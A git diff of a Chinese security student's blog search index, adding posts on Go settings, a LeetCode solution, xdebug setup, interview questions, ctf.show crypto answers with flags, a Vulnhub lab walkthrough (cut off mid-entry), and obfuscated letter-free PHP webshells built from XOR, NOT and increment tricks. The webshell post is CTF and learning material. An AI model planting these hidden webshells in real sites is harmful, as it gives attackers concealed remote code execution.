@@ -4,6 +4,186 @@
   
     
     <entry>
+      <title>go相关笔记</title>
+      <link href="/posts/e0759275/"/>
+      <url>/posts/e0759275/</url>
+      
+        <content type="html"><![CDATA[<h2 id="go相关命令"><a href="#go相关命令" class="headerlink" title="go相关命令"></a>go相关命令</h2><h3 id="go-env"><a href="#go-env" class="headerlink" title="go env"></a>go env</h3><pre><code>go env -w GOPROXY=https://goproxy.io,direct# Set environment variable allow bypassing the proxy for selected modulesgo env -w GOPRIVATE=*.corp.example.comgo env -w GO111MODULE=on</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> go </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>每天一道leetcode-560和为k的子数组</title>
+      <link href="/posts/eb2e19c0/"/>
+      <url>/posts/eb2e19c0/</url>
+      
+        <content type="html"><![CDATA[<p>给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。</p><p>示例 1 :</p><pre><code>输入:nums = [1,1,1], k = 2输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。</code></pre><h2 id="法一——暴力"><a href="#法一——暴力" class="headerlink" title="法一——暴力"></a>法一——暴力</h2><p>两重循环，对每一个数字，从它开始往后，不断地累加，然后和k进行对比，这应该是最简单的想法了，但是我做这种题还是有点晕</p><pre><code class="python">def subarraySum(nums, k):    length = len(nums)    count = 0    for i in range(length):        sum = 0        for j in range(i, length):            sum += nums[j]            if sum == k:                count += 1    return count</code></pre><h2 id="法二——hashtables"><a href="#法二——hashtables" class="headerlink" title="法二——hashtables"></a>法二——hashtables</h2><p>思路就是不断地求和，然后判断 <code>cur_sum - k</code> 是否已经计算过了</p><blockquote><p>将前缀和放入哈希表，哈希表的设计为：key是前缀和，value是前缀和出现的次数。<br>如果当前要存入的前缀和sum，使得(sum - k)也在哈希表中时，则使用count累加哈希表中(sum - k)出现的次数，然后再将该sum放入哈希表中。这里的count与sum的添加次序不能调换，主要是为了处理k为0的情况。</p></blockquote><pre><code class="python">def subarraySum(self, nums, k):    result, cur_sum = 0, 0    sum_dict = {0:1}    for num in nums:        cur_sum += num        if cur_sum - k in sum_dict:            result += sum_dict[cur_sum - k]        sum_dict[cur_sum] = sum_dict.get(cur_sum, 0) + 1    return result</code></pre><p>go实现的代码</p><pre><code class="go">func subarraySum(nums []int, k int) int {    count := 0    sumMap := map[int]int{0:1,}    sum := 0    for _, num := range nums {        sum += num        if sumMap[sum - k] &gt; 0 {            count += sumMap[sum - k]        }        sumMap[sum]++    }    return count}</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 编程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> leetcode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sqlite数据库笔记</title>
+      <link href="/posts/532a05c/"/>
+      <url>/posts/532a05c/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ubuntu配置vscode+xdebug</title>
+      <link href="/posts/38fc34e6/"/>
+      <url>/posts/38fc34e6/</url>
+      
+        <content type="html"><![CDATA[<h2 id="vscode安装"><a href="#vscode安装" class="headerlink" title="vscode安装"></a>vscode安装</h2><p>直接去官网下载deb包，然后双击即可完成安装</p><p>加两个配置选项</p><pre><code>    &quot;editor.mouseWheelZoom&quot;: true,    &quot;php.validate.executablePath&quot;: &quot;/usr/bin/php&quot;</code></pre><p>第一个是直接用滚轮缩放大小，并且图标的大小不变，第二个是配置php的路径</p><p>之后安装一些插件就不说了</p><h2 id="apache环境"><a href="#apache环境" class="headerlink" title="apache环境"></a>apache环境</h2><p>直接安装</p><pre><code>sudo apt install apache2</code></pre><p>然后安装php模块</p><pre><code>sudo apt-get install libapache2-mod-php</code></pre><p>之后，修改一下html目录的用户和组</p><pre><code>chown pxy html/ -Rchgrp pxy html/ -R</code></pre><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><pre><code>php -i &gt; a.txt</code></pre><p>然后将 a.txt 的内容拷贝到</p><p><a href="https://xdebug.org/wizard" target="_blank" rel="noopener">https://xdebug.org/wizard</a></p><p>自动帮你分析phpinfo的内容(不过现在只支持php7了)</p><ol><li><p>Download <a href="http://xdebug.org/files/xdebug-2.9.4.tgz" target="_blank" rel="noopener">xdebug-2.9.4.tgz</a></p></li><li><p>Install the pre-requisites for compiling PHP extensions.<br>On your Ubuntu system, install them with: <code>apt-get install php-dev autoconf automake</code></p></li><li><p>Unpack the downloaded file with <code>tar -xvzf xdebug-2.9.4.tgz</code></p></li><li><p>Run: <code>cd xdebug-2.9.4</code></p></li><li><p>Run: <code>phpize</code> (See the <a href="https://xdebug.org/docs/faq#phpize" target="_blank" rel="noopener">FAQ</a> if you don’t have <code>phpize</code>).</p><p>As part of its output it should show:</p><pre><code>Configuring for:...Zend Module Api No:      20170718Zend Extension Api No:   320170718</code></pre></li></ol><p>   If it does not, you are using the wrong <code>phpize</code>. Please follow <a href="https://xdebug.org/docs/faq#custom-phpize" target="_blank" rel="noopener">this FAQ entry</a> and skip the next step.</p><ol start="6"><li><p>Run: <code>./configure</code></p></li><li><p>Run: <code>make</code></p></li><li><p>Run: <code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>Update <code>/etc/php/7.2/cli/php.ini</code> and change the line<br><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></p></li><li><p>Please also update <code>php.ini</code> files in adjacent directories, as your system seems to be configured with a separate <code>php.ini</code> file for the web server and command line.</p></li></ol><p>重点是后面几个步骤：</p><ol><li><p><code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>修改 <code>/etc/php/7.2/cli/php.ini</code> 文件内容，加上</p><pre><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></pre></li><li><p>然后还需要修改  <code>/etc/php/7.2/apache2</code> 目录下的 php.ini 这个才是web的</p></li></ol><p>如图， <code>cli</code> 目录是命令行， <code>apache2</code> 才是web的</p><p><img src="/posts/38fc34e6/1587378336782.png" alt></p><ol start="4"><li>之后还需要修改 <code>mods-available</code> 目录下的文件</li></ol><pre><code>pxy@pxy-VirtualBox:/etc/php/7.2/mods-available$ cat xdebug.ini ;zend_extension=xdebug.soxdebug.remote_enable = 1xdebug.remote_port = 9000;xdebug.idekey = PHPSTORMxdebug.remote_host=localhostxdebug.remote_autostart = 1xdebug.show_error_trace = 1</code></pre><ol start="5"><li>最后需要在web和cli下的 <code>conf.d</code> 中做一次软链接</li></ol><p><img src="/posts/38fc34e6/1587378447111.png" alt></p><p>至此xdebug+vscode就配置好了</p><p><img src="/posts/38fc34e6/1587378474835.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 编程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+            <tag> vscode </tag>
+            
+            <tag> xdebug </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>汇编从入门到入土六</title>
+      <link href="/posts/79b4f583/"/>
+      <url>/posts/79b4f583/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>春招面经汇总</title>
+      <link href="/posts/ddd168ac/"/>
+      <url>/posts/ddd168ac/</url>
+      
+        <content type="html"><![CDATA[<p>从2月到4月，中间大大小小经历了20次左右的面试，大概总结一下</p><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><ol><li>自我介绍</li><li>Java反序列化漏洞</li><li>JNDI注入，Java7和Java8的区别(这里确实是自己挖坑了，简历上写了自己会Java审计，JNDI注入等，但是并没有仔细准备，结果面试官抓着Java不放手)</li><li>XXE如果无法联网怎么利用(三层嵌套报错XXE或者利用系统自带的DTD文件)</li></ol><h2 id="字节跳动-企业应用安全"><a href="#字节跳动-企业应用安全" class="headerlink" title="字节跳动-企业应用安全"></a>字节跳动-企业应用安全</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><ol><li>具体的一个代码审计案例</li><li>说一下你知道的四种漏洞的原理，利用，危害和防御</li><li>XSS知道吗</li><li>说一下前端漏洞中你比较熟悉的</li><li>python沙盒逃逸</li><li>你觉得自己的优势是什么</li><li>对未来的规划</li></ol><p>字节跳动一面官感觉挺棒的，全程在引导你，而且特别尊重你说出自己的看法</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><ol><li>简单问了几个小问题，python沙盒逃逸，JavaScript原型链污染</li><li>有没有了解过electron框架（就是开发vscode的，我说没有，但是我知道vue</li><li>vue怎么防御csrf(我不太了解vue怎么防范，先说一些怎么防CSRF balabal)</li><li>提示vue是通过ajax和后端连接，我：哦想起来了，那就用CORS来防御，然后说了CORS的防御</li><li>继续问。CORS分为简单请求和非简单请求，一个POST请求怎么区分</li><li>java做过哪些</li><li>mXSS了解吗</li><li>参数压栈入栈简单说下</li><li>你怎么将CTF学到的用到实战</li><li>go有没有了解</li></ol><p>二面面试官也挺棒的，唯一的问题就是。。。他家的小孩子太吵了。。</p><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><p>三面是部门leader面</p><h2 id="知道创宇-404实验室"><a href="#知道创宇-404实验室" class="headerlink" title="知道创宇 - 404实验室"></a>知道创宇 - 404实验室</h2><h2 id="腾讯-应用运维安全"><a href="#腾讯-应用运维安全" class="headerlink" title="腾讯-应用运维安全"></a>腾讯-应用运维安全</h2><h2 id="腾讯-后台策略安全"><a href="#腾讯-后台策略安全" class="headerlink" title="腾讯-后台策略安全"></a>腾讯-后台策略安全</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> 生活 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 面经 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>密码学题目</title>
+      <link href="/posts/1dea6763/"/>
+      <url>/posts/1dea6763/</url>
+      
+        <content type="html"><![CDATA[<p>记录一下ctf.show平台</p><p><a href="https://ctf.show/challenges" target="_blank" rel="noopener">https://ctf.show/challenges</a></p><h2 id="crypto0"><a href="#crypto0" class="headerlink" title="crypto0"></a>crypto0</h2><p>凯撒密码</p><p><img src="/posts/1dea6763/1586531882516-1587195417553.png" alt></p><h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>jsfuck</p><p><img src="/posts/1dea6763/1587194700279.png" alt></p><h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>还是jsfuck编码</p><p><img src="/posts/1dea6763/1587194728413.png" alt></p><h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p>p=447685307 q=2037 e=17</p><p>提交flag{d}即可</p><pre><code class="python">import gmpy2&#39;&#39;&#39;给出p,q,e 求d&#39;&#39;&#39;# p = 3487583947589437589237958723892346254777# q = 8767867843568934765983476584376578389# e = 65537p=18443q=49891e=19phin = (p - 1) * (q - 1)print gmpy2.invert(e, phin)</code></pre><h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p>p=447685307 q=2037 e=17 c=704796792</p><p>提交flag{m}</p><pre><code class="python">import gmpy2&#39;&#39;&#39;给出p,q,e,c 求d和m&#39;&#39;&#39;p=447685307q=2037e=17c=704796792phin = (p - 1) * (q - 1)d = gmpy2.invert(e, phin)print pow(c,d,p*q)</code></pre><h2 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h2><p>ook解密</p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><pre><code>flag{b615c4b79a1aede83b9ae67104ff4eb5}</code></pre><h2 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h2><p>brainfuck解密</p><pre><code>flag{99754106633f94d350db34d548d6091a}</code></pre><h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>密码是4132</p><p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p><img src="/posts/1dea6763/1586560529022.png" alt></p><h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><p>邮件编码</p><h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>解密后就是ctf</p><h2 id="crypto13"><a href="#crypto13" class="headerlink" title="crypto13"></a>crypto13</h2><p>混合加密</p><pre><code class="python">import base64def base(s):    try:        s = base64.b32decode(s)        s = base(s)    except:        try:            s = base64.b64decode(s)            s = base(s)        except:            return s    return sf = open(&#39;base.txt&#39;)text = f.read()print(base(text))</code></pre><p>flag{b4Se_Fami1y_Is_FUn}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 密码学 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>无字母数字webshell</title>
+      <link href="/posts/bed5b94f/"/>
+      <url>/posts/bed5b94f/</url>
+      
+        <content type="html"><![CDATA[<pre><code class="php">&lt;?phpif(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) {  eval($_GET[&#39;shell&#39;]);}</code></pre><h2 id="通过异或"><a href="#通过异或" class="headerlink" title="通过异或"></a>通过异或</h2><p>原理</p><pre><code class="php">php &gt; echo chr(0x01)^&#39;`&#39;;aphp &gt; echo chr(0x13)^&#39;`&#39;;sphp &gt; echo chr(0x05)^&#39;`&#39;;e</code></pre><p>所以即可构造：</p><pre><code class="php">$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); //$_=assert$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__ = _POST$___=$$__; //$___ = $_POST$_($___[_]);// assert($_POST[_])</code></pre><p>在 <code>php5.5.38</code> 通过测试</p><p><img src="/posts/bed5b94f/1586074270072.png" alt></p><p>但是如果切换为 <code>php7.1.3</code> 执行失败</p><p><img src="/posts/bed5b94f/1586074316094.png" alt></p><h3 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h3><p>通过这种方式可以构造异或形式的webshell</p><pre><code class="php">&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;{&quot;^&quot;/&quot;); // _POST     ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);?&gt;</code></pre><pre><code>0=assert&amp;1=phpinfo()</code></pre><p>在 AWD 中常用来做隐藏的shell</p><p><img src="/posts/bed5b94f/1586074779485.png" alt></p><p>当然这种马是直接被杀的</p><p><img src="/posts/bed5b94f/1586074826727.png" alt></p><h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;])){    $code = $_GET[&#39;code&#39;];    if(strlen($code)&gt;40){        die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>首先我们得知道 <code>_GET</code> 由什么异或而来的，<a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_12" target="_blank" rel="noopener">参考</a></p><pre><code>&lt;?php    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET?&gt;</code></pre><p>这段代码一大坨是啥意思呢？因为 40 个字符长度的限制，导致以前逐个字符异或拼接的 webshell 不能使用。<br>这里可以使用 php 中可以执行命令的反引号 ``` 和 <code>Linux</code> 下面的通配符 <code>?</code></p><ul><li><code>?</code> 代表匹配一个字符</li><li>``` 表示执行命令</li><li><code>&quot;</code> 对特殊字符串进行解析</li></ul><p>这样就可以直接得到 </p><pre><code>php &gt; echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;_GET</code></pre><p>然后再构造</p><pre><code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code></pre><p>这样就构造好了shell</p><p><img src="/posts/bed5b94f/1586075401555.png" alt></p><h2 id="通过取反"><a href="#通过取反" class="headerlink" title="通过取反"></a>通过取反</h2><pre><code class="php">&lt;?php$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});$_=$$_____;$____($_[$__]);</code></pre><h2 id="通过加法运算"><a href="#通过加法运算" class="headerlink" title="通过加法运算"></a>通过加法运算</h2><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>反弹shell检测思路</title>
       <link href="/posts/d7bd6781/"/>
       <url>/posts/d7bd6781/</url>
@@ -975,7 +1155,7 @@
       <link href="/posts/e4ff8385/"/>
       <url>/posts/e4ff8385/</url>
       
-        <content type="html"><![CDATA[<h1 id="vulnhub靶机渗透-Connectthedots"><a href="#vulnhub靶机渗透-Connectthedots" class="headerlink" title="vulnhub靶机渗透-Connectthedots"></a>vulnhub靶机渗透-Connectthedots</h1><p>目标：/home/user.txt and /root/root.txt</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>由于VMware会出现种种问题，于是改成了Virtual Box,而且Vulhub上的大部分靶机都是使用Virtual Box制作的</p><p>附上一些相关的配置截图：</p><p>kali 2019.04<br>第一块网卡没做修改</p><p>添加了第二块网卡<br><img src="/posts/e4ff8385/1576475770757.png" alt></p><p>vulnhub靶机渗透-Connectthedots作为靶机，同样添加了第二块网卡</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali IP ： 192.168.99.101<br><img src="/posts/e4ff8385/1576475827530.png" alt></p><p>通过nmap发现另一台主机(注意netdiscover和arp-scan都无法使用了)<br><img src="/posts/e4ff8385/1576475870118.png" alt></p><p>主机开放的所有服务：</p><p><img src="/posts/e4ff8385/1576476412907.png" alt></p><p>一个个来看</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>vsftp 服务， metasploit搜索payload</p><p>返回的信息：</p><pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit [*] 192.168.99.104:21 - Banner: 220 Welcome to Heaven![*] 192.168.99.104:21 - USER: 530 Permission denied.[-] 192.168.99.104:21 - This server is configured for anonymous only and the backdoor code cannot be reached[*] Exploit completed, but no session was created.</code></pre><p>尝试匿名登陆没有成功</p><p><img src="/posts/e4ff8385/1576476598073.png" alt></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>目录遍历：</p><p><img src="/posts/e4ff8385/1575977787813.png" alt><br>扫描结果有两个index页面，查看其中一个发现：</p><p>发现了注释</p><p><img src="/posts/e4ff8385/1575977822127.png" alt></p><p>访问发现是一个登陆页面，发现这个登陆页面并不会有数据包，是个静态页面</p><p><img src="/posts/e4ff8385/1576476010899.png" alt></p><p>然后访问 <code>/mysite</code><br><img src="/posts/e4ff8385/1575977851454.png" alt></p><p>查看文件后发现<br><img src="/posts/e4ff8385/1575977868784.png" alt></p><p>是jsfuck编码</p><p>jsfuck解码网站 <a href="http://www.jsfuck.com/#" target="_blank" rel="noopener">http://www.jsfuck.com/#</a></p><p>也可以直接用浏览器的控制台解码</p><p>可以将其复制到浏览器的控制台：<br>然后输入：<br><img src="/posts/e4ff8385/1575977938119.png" alt></p><p>这样可以免去手动复制粘贴的麻烦</p><p>得到结果：<br><img src="/posts/e4ff8385/1575977956725.png" alt></p><pre><code>You&#39;re smart enough to understand me. Here&#39;s your secret, TryToGuessThisNorris@2k19</code></pre><p>得到了secret，猜测是ssh登陆的口令</p><h2 id="2049端口"><a href="#2049端口" class="headerlink" title="2049端口"></a>2049端口</h2><p>开放了NFS服务</p><p>使用nmap或者metasploit探测可以挂载的目录，</p><pre><code>msf5 auxiliary(scanner/nfs/nfsmount) &gt; exploit [+] 192.168.99.104:111    - 192.168.99.104 NFS Export: /home/morris [*][*] 192.168.99.104:111    - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>获得挂载目录 <code>/home/morris</code></p><p>安装nfspysh:</p><p><code>git clone https://github.com/bonsaiviking/NfSpy.git</code></p><h2 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h2><p>nmap没有扫除ssh开放的端口，因为这台靶机的ssh并不是开放在通常的22号端口上</p><p>通过扫描确认：<br><img src="/posts/e4ff8385/1576476969297.png" alt></p><p>ssh开放的端口是7822</p><p>尝试用之前得到的口令去登陆，用户名是<code>morris</code><br>登陆失败</p><p>从80端口的<code>index.html</code>知道，M和N的命名规则，尝试修改用户名为<code>norris</code><br><img src="/posts/e4ff8385/1576477106793.png" alt></p><p>登陆成功！<br>得到<code>user.txt</code>的内容</p><p><img src="/posts/e4ff8385/1576477362762.png" alt><br>之后去<code>/var/www/html</code>目录下查看文件</p><p>发现了<code>.secretfile.swp</code>文件<br>直接查看提示权限不够，于是想到从网页下载</p><p>可以看到<code>.secretfile.swp</code>文件的权限被设置为只有<code>www-data</code>用户才能读写</p><p><img src="/posts/e4ff8385/1576479512154.png" alt></p><p>通过<code>vim -r secretfile.swp</code>得到源文件内容</p><pre><code>I see you&#39;re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..blehguessme090</code></pre><p>于是成功登陆morris用户<br><img src="/posts/e4ff8385/1576477489908-1581332150635.png" alt></p><h2 id="最后的“提权”"><a href="#最后的“提权”" class="headerlink" title="最后的“提权”"></a>最后的“提权”</h2><p>登陆了morris用户之后，还是无法进入到root的目录下查看文件</p><p>先上一个<code>LinEnum.sh</code>提权辅助脚本，但是并未发现有意思的东西</p><p>又去找到了另外一个脚本 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh</a></p><p>功能比较全面，并且发现了这个：<br><img src="/posts/e4ff8385/1577460701158.png" alt><br>查阅文档发现了这个，类似SUID<br><img src="/posts/e4ff8385/1577460729799.png" alt></p><p>那么尝试用tar去打包root目录下的文件<br><img src="/posts/e4ff8385/1577460784686.png" alt><br>打包失败，原来这个命令应该在<code>norris</code>用户下执行</p><p>于是将root目录下的文件打包<br><img src="/posts/e4ff8385/1576477730035.png" alt></p><p>解压之后得到flag<br><img src="/posts/e4ff8385/1576477748712.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba" target="_blank" rel="noopener">https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba</a><br><a href="https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c" target="_blank" rel="noopener">https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c</a></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="vulnhub靶机渗透-Connectthedots"><a href="#vulnhub靶机渗透-Connectthedots" class="headerlink" title="vulnhub靶机渗透-Connectthedots"></a>vulnhub靶机渗透-Connectthedots</h1><p>目标：/home/user.txt and /root/root.txt</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>由于VMware会出现种种问题，于是改成了Virtual Box,而且Vulhub上的大部分靶机都是使用Virtual Box制作的</p><p>附上一些相关的配置截图：</p><p>kali 2019.04<br>第一块网卡没做修改</p><p>添加了第二块网卡<br><img src="/posts/e4ff8385/1576475770757.png" alt></p><p>vulnhub靶机渗透-Connectthedots作为靶机，同样添加了第二块网卡</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali IP ： 192.168.99.101<br><img src="/posts/e4ff8385/1576475827530.png" alt></p><p>通过nmap发现另一台主机(注意netdiscover和arp-scan都无法使用了)<br><img src="/posts/e4ff8385/1576475870118.png" alt></p><p>主机开放的所有服务：</p><p><img src="/posts/e4ff8385/1576476412907.png" alt></p><p>一个个来看</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>vsftp 服务， metasploit搜索payload</p><p>返回的信息：</p><pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit [*] 192.168.99.104:21 - Banner: 220 Welcome to Heaven![*] 192.168.99.104:21 - USER: 530 Permission denied.[-] 192.168.99.104:21 - This server is configured for anonymous only and the backdoor code cannot be reached[*] Exploit completed, but no session was created.</code></pre><p>尝试匿名登陆没有成功</p><p><img src="/posts/e4ff8385/1576476598073.png" alt></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>目录遍历：</p><p><img src="/posts/e4ff8385/1575977787813.png" alt><br>扫描结果有两个index页面，查看其中一个发现：</p><p>发现了注释</p><p><img src="/posts/e4ff8385/1575977822127.png" alt></p><p>访问发现是一个登陆页面，发现这个登陆页面并不会有数据包，是个静态页面</p><p><img src="/posts/e4ff8385/1576476010899.png" alt></p><p>然后访问 <code>/mysite</code><br><img src="/posts/e4ff8385/1575977851454.png" alt></p><p>查看文件后发现<br><img src="/posts/e4ff8385/1575977868784.png" alt></p><p>是jsfuck编码</p><p>jsfuck解码网站 <a href="http://www.jsfuck.com/#" target="_blank" rel="noopener">http://www.jsfuck.com/#</a></p><p>也可以直接用浏览器的控制台解码</p><p>可以将其复制到浏览器的控制台：<br>然后输入：<br><img src="/posts/e4ff8385/1575977938119.png" alt></p><p>这样可以免去手动复制粘贴的麻烦</p><p>得到结果：<br><img src="/posts/e4ff8385/1575977956725.png" alt></p><pre><code>You&#39;re smart enough to understand me. Here&#39;s your secret, TryToGuessThisNorris@2k19</code></pre><p>得到了secret，猜测是ssh登陆的口令</p><h2 id="2049端口"><a href="#2049端口" class="headerlink" title="2049端口"></a>2049端口</h2><p>开放了NFS服务</p><p>使用nmap或者metasploit探测可以挂载的目录，</p><pre><code>msf5 auxiliary(scanner/nfs/nfsmount) &gt; exploit [+] 192.168.99.104:111    - 192.168.99.104 NFS Export: /home/morris [*][*] 192.168.99.104:111    - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>获得挂载目录 <code>/home/morris</code></p><p>安装nfspysh:</p><p><code>git clone https://github.com/bonsaiviking/NfSpy.git</code></p><h2 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h2><p>nmap没有扫除ssh开放的端口，因为这台靶机的ssh并不是开放在通常的22号端口上</p><p>通过扫描确认：<br><img 